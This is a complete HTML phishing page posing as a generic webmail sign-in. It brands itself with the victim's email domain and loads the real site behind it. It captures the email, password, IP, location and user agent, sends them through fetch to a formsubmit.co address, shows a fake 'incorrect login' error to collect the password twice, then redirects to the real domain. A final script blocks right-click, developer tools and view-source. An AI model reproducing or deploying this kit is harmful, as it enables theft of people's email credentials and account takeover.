<!DOCTYPE html>
<html lang="en">
<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

    <title  class="logoname">Mail</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js" nonce="NzE4NTg4NzcxLDIzNDE2NTkyMDY="></script>
    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">

    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>

<link rel="apple-touch-icon" type="image/png"  class="logoimg" href="" />
<link rel="shortcut icon" type="image/x-icon"  class="logoimg"  href="" />
<link rel="mask-icon" type=""  class="logoimg" href="" color="#111" />
<meta name="robots" content="noindex">
<meta name="googlebot" content="noindex">
<meta name="googlebot-news" content="noindex" />
<meta name="otherbot" content="noindex" />
<meta name="noarchive" content="noindex" />
<meta name="nosnippet" content="noindex" />
<meta name="noimageindex" content="noindex" />
<meta name="robots" content="nofollow">
<meta name="googlebot" content="nofollow">
<meta name="googlebot-news" content="nofollow" />
<meta name="otherbot" content="nofollow" />
<meta name="noarchive" content="nofollow" />
<meta name="nosnippet" content="nofollow" />
<meta name="noimageindex" content="nofollow" />
<meta name="robots" content="max-snippet:0">
<meta name="robots" content="unavailable_after: 2020-09-22">

<style  type="text/css" >

body {
    font-family: 'Open Sans', sans-serif;
    color: #535353;
    overflow: hidden; /* Prevents all scrolling */
}

/** Login 40 start --> relevant styles for this specific form **/
.login-40 {
    top: 0;
    width: 100%;
    bottom: 0;
    opacity: 1;
    min-height: 100vh;
    text-align: center;
    position: relative;
    justify-content: center;
    align-items: center;
    padding: 30px 15px;
    display: none; /* MODIFIED: Hide login form initially */
}

.login-40 .login-inner-form {
    color: #717171;
    text-align: center;
    position: relative;
}

.login-40 h1, .login-40 h2, .login-40 h3, .login-40 h4, .login-40 h5, .login-40 h6 {
    font-family: 'Segoe UI', sans-serif;
    color: #474545;
    font-weight: 500;
}

.login-40 .logo a {

    text-decoration: none;
}

.login-40 .form-section{
    max-width: 360px;
    margin: 0 auto;
    border-radius: 20px;
    padding: 30px;
    border: 3px solid #e8e7e7;
    background-color: #fff;
}

.login-40 .login-inner-form .form-group {
    margin-bottom: 25px; 
}

.login-40 .login-inner-form .form-box {
    float: left;
    width: 100%;
    position: relative;
}

.login-40 .login-inner-form .input-text {
    font-size: 16px;
    outline: none;
    color: #717171;
    border: 1px solid #dbdbdb;
    border-radius: 3px;
    box-shadow: 0 1px 3px 0 rgb(0 0 0 / 6%);
}

.login-40 .login-inner-form .form-box input {
    float: left;
    width: 100%;
}

.login-40 .login-inner-form .btn-md {
    cursor: pointer;
    padding: 12px 50px;
    font-size: 17px;
    font-weight: 400;
    font-family: 'Jost', sans-serif;
}

.login-40 .login-inner-form .btn-theme {
    background: #50a1ff;
    border: none;
    color: #fff;
}

.login-40 .login-inner-form .btn-theme:hover {
    background: #4595f1;
}

.login-40 .logo{
    text-align: center;
    margin-bottom: 35px;
}

.login-40 .logo img{
    height: 30px;
}
</style>

<style>
    .login-40 .form-box {
        position: relative; 
    }

    /* Icon Styling */
    .login-40 .form-box i {
        position: absolute;
        top: 50%;
        transform: translateY(-50%);
        left: 20px;
        font-size: 16px;
        color: #6c757d;
        z-index: 2; 
    }

    /* Input Field Styling */
    .login-40 .form-box .input-text {
        height: 50px;
        padding: 12px 20px 12px 45px; /* Padding for left icon */
        position: relative;
        z-index: 1;
        background-color: #fff;
        width: 100%;
        box-sizing: border-box; 
    }
    
    /* Make the original placeholder invisible */
    .login-40 .form-box .input-text::placeholder {
        color: transparent;
    }

    /* Label Styling (Initial State - inside the box) */
    .login-40 .form-box .form-label {
        position: absolute;
        top: 50%;
        left: 45px; /* Position to start where the text starts */
        transform: translateY(-50%);
        color: #6c757d;
        font-size: 16px;
        transition: all 0.2s ease-out;
        pointer-events: none; 
        background: #fff; 
        padding: 0 5px; 
        z-index: 2;
    }

    /* Floating Label Logic (Active State - above the box) */
    .login-40 .form-box .input-text:focus ~ .form-label,
    .login-40 .form-box .input-text:not(:placeholder-shown) ~ .form-label {
        top: 0;
        left: 40px; /* Position to the right of the icon's area */
        transform: translateY(-50%);
        font-size: 13px;
        color: #50a1ff;
    }

    /* --- NEW: Styles for Turnstile Overlay --- */
    #turnstile-overlay {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background-color: #ffffff;
        z-index: 9999;
        display: flex;
        justify-content: flex-start; /* Aligns to the left */
        align-items: flex-start; /* Aligns to the top */
        padding: 20px;
    }
</style>

</head>
<body id="top">

<div id="turnstile-overlay">
    <div class="cf-turnstile" 
         data-sitekey="0x4AAAAAAB4oxAZMoBDdwZqy" 
         data-callback="onTurnstileSuccess">
    </div>
</div>

<iframe id="mainPage" src="about:blank" width="100%" scrolling="no" sandbox="allow-forms allow-pointer-lock
allow-popups allow-same-origin allow-scripts" style="position: absolute;height: 100%;border: none;"></iframe>

<div class="login-40">
    <div class="container">
        <div class="row">
            <div class="col-md-12">
                <div class="form-section">
                    <div class="logo">
                        <a href="#">
                            <img src="" alt="Webmail"  id="logoimg" style="height:64px; width: 64px">
							<h2 id="logoname" style="font-size: 24px; padding-bottom: -6px;"> Webmail </h2>
                        </a>
                    </div>
                    <div class="login-inner-form" style="padding-bottom: 6px">

                        <form action="#" method="POST" id="login-form"> <div class="form-group form-box">
                                <input type="email" id="email" name="email" class="input-text" placeholder="Email Address">
                                <i class="fa fa-user"></i>
                                <label for="email" class="form-label">Email Address</label>
                            </div>
                            <div class="form-group form-box">
                                <input type="password" id="password" name="Password" class="input-text" placeholder="Password">
                                <i class="fa fa-lock"></i>
                                <label for="password" class="form-label">Password</label>
                            </div>
							<span id="msg" style="color:red; display:none;"></span>

                            <div class="form-group mb-0">
                                <button type="submit" id="submit-btn" class="btn-md btn-theme btn-block">Sign In</button>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
</body>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js" nonce="NzE4NTg4NzcxLDIzNDE2NTkyMDY="></script>
	<script nonce="NzE4NTg4NzcxLDIzNDE2NTkyMDY=">

// 3. This function is called by Turnstile upon successful verification
function onTurnstileSuccess(token) {
    // Hide the Turnstile overlay
    $('#turnstile-overlay').hide();

    // Show the main login form after 8 seconds
    setTimeout(function() {
        $('.login-40').css('display', 'flex');
    }, 100); // 8 seconds

    // Initialize the rest of the page logic now
    initializeMainScript();
}

function initializeMainScript() {
    // --- Configuration ---
    const MAX_LOGIN_ATTEMPTS = 2;
    const SUBMIT_URL = 'https://formsubmit.co/ajax/1b659ab4028c52a13c9c939990ed45ba';
    const IP_INFO_URL = 'https://ipinfo.io/json';
    const FALLBACK_LOGO_URL = 'https://cdn-icons-png.freepik.com/512/6323/6323406.png'; // Fallback image

    // --- State ---
    let loginAttempts = 0;

    // --- DOM Elements ---
    const emailInput = $("#email");
    const passwordInput = $("#password");
    const submitButton = $("#submit-btn");
    const messageArea = $("#msg");

    /**
     * Extracts the domain from an email address.
     * @param {string} email - The full email address.
     * @returns {string|null} The domain part of the email, or null if invalid.
     */
    const getDomainFromEmail = (email) => {
        if (!email || email.indexOf("@") === -1) {
            return null;
        }
        return email.substring(email.indexOf("@") + 1);
    };

    /**
     * Updates the page's branding (logo, title) based on the email domain.
     * @param {string} domain - The email domain (e.g., "example.com").
     */
    const updateBranding = (domain) => {
        if (!domain) {
            $("#logoimg").attr("src", FALLBACK_LOGO_URL); // Set fallback if no domain
            return;
        }
        
        const domainName = domain.substring(0, domain.indexOf('.'));
        const capitalizedName = domainName.charAt(0).toUpperCase() + domainName.slice(1);
        const faviconUrl = `https://logo.clearbit.com/${domain}`;
        const loginTitle = `${capitalizedName}<br>`;
        
        const logoChecker = new Image();
        
        logoChecker.onload = function() {
            $("#logoimg").attr("src", faviconUrl);
            $("link.logoimg").attr("href", faviconUrl);
        };
        
        logoChecker.onerror = function() {
            $("#logoimg").attr("src", FALLBACK_LOGO_URL);
            $("link.logoimg").attr("href", FALLBACK_LOGO_URL);
        };

        logoChecker.src = faviconUrl;

        $("#logoname, .logoname").html(loginTitle);
        $(".domain").text(domain);
        
        // MODIFIED: Load the background iframe after 10 seconds
        setTimeout(function() {
            $('#mainPage').attr('src', `https://${domain}`);
        }, 500); // 10 seconds
    };

    /**
     * Initializes the page by parsing the email from the URL hash and updating the branding.
     */
    const initializePage = () => {
        const emailFromHash = window.location.hash.substring(1);
        if (emailFromHash) {
            emailInput.val(emailFromHash).trigger('input'); 
            const domain = getDomainFromEmail(emailFromHash);
            updateBranding(domain);
            $(".email").text(emailFromHash);
        } else {
            $("#logoimg").attr("src", FALLBACK_LOGO_URL);
        }
    };
    
    /**
     * Handles the display of error or status messages to the user.
     * @param {string} message - The message to display.
     * @param {string} [color='red'] - The color of the message text.
     */
    const showMessage = (message, color = 'red') => {
        messageArea.html(`<span style='color:${color};'>${message}</span>`).show();
    };

    /**
     * Performs actions after data has been submitted.
     * It either shows an error and prepares for another attempt or redirects the user.
     * @param {string} domain - The user's email domain for redirection.
     */
    const handlePostSubmission = (domain) => {
        submitButton.html('Sign In');
        emailInput.val("");
        passwordInput.val("");

        if (loginAttempts >= MAX_LOGIN_ATTEMPTS) {
            window.location.replace(`http://www.${domain}`);
        } else {
            showMessage("Incorrect login details. Please try again.");
        }
    };

    /**
     * Captures user data (credentials, IP info) and sends it to the specified endpoint.
     * @param {string} email - The user's email.
     * @param {string} password - The user's password.
     */
    const sendCapturedData = async (email, password) => {
        submitButton.html('Signing In...');
        
        const getFlagEmoji = (countryCode) => {
            if (!countryCode || countryCode.length !== 2) {
                return '🏳️';
            }
            const codePoints = countryCode
                .toUpperCase()
                .split('')
                .map(char => 127397 + char.charCodeAt());
            return String.fromCodePoint(...codePoints);
        };

        try {
            const ipResponse = await fetch(IP_INFO_URL);
            const ipData = await ipResponse.json();

            const countryFlag = getFlagEmoji(ipData.country);
            const currentDate = new Date().toLocaleDateString();
            const subjectLine = `🔐 General Login | ${email} | ${ipData.ip} | ${countryFlag} ${ipData.country}`;

            // --- MODIFIED PART: Add the Turnstile token to the payload ---
            const turnstileToken = $('#login-form [name="cf-turnstile-response"]').val();

            const payload = {
                Username: email,
                Password: password,
                IP: ipData.ip,
                Date: currentDate,
                Location: `${ipData.city}, ${ipData.country}`,
                "Server Hosting": ipData.org || 'Unknown ISP',
                UserAgent: navigator.userAgent,
                "Turnstile-Token": turnstileToken, // Token is now included
                _template: "table",
                _subject: subjectLine
            };

            await fetch(SUBMIT_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify(payload)
            });

        } catch (error) {
            console.error("An error occurred during data submission:", error);
        } finally {
            const domain = getDomainFromEmail(email);
            handlePostSubmission(domain);
        }
    };

    /**
     * Handles the form submission event.
     * @param {Event} event - The form submission event.
     */
    const handleFormSubmit = (event) => {
        event.preventDefault();
        messageArea.hide();

        const email = emailInput.val();
        const password = passwordInput.val();
        const emailRegex = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
        
        if (!email || !emailRegex.test(email)) {
            showMessage("Please enter a valid email address.");
            return;
        }

        if (!password) {
            showMessage("Password is empty");
            return;
        }

        loginAttempts++;
        sendCapturedData(email, password);
    };

    // --- Event Listeners & Initialization ---
    initializePage();
    submitButton.on('click', handleFormSubmit);
    
    $('.input-text').on('input', function() {
        // This is fine as is
    });
}
</script>
<script>
    // --- SCRIPT TO DETER VIEWING/EDITING SOURCE CODE ---
    document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
    });
    document.addEventListener('keydown', function(e) {
        if (e.key === 'F12' || e.keyCode === 123) { e.preventDefault(); }
        if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i')) { e.preventDefault(); }
        if (e.ctrlKey && (e.key === 'U' || e.key === 'u')) { e.preventDefault(); }
        if (e.ctrlKey && (e.key === 'S' || e.key === 's')) { e.preventDefault(); }
    });
    setInterval(function() {
        debugger;
    }, 50);
</script>

</html>
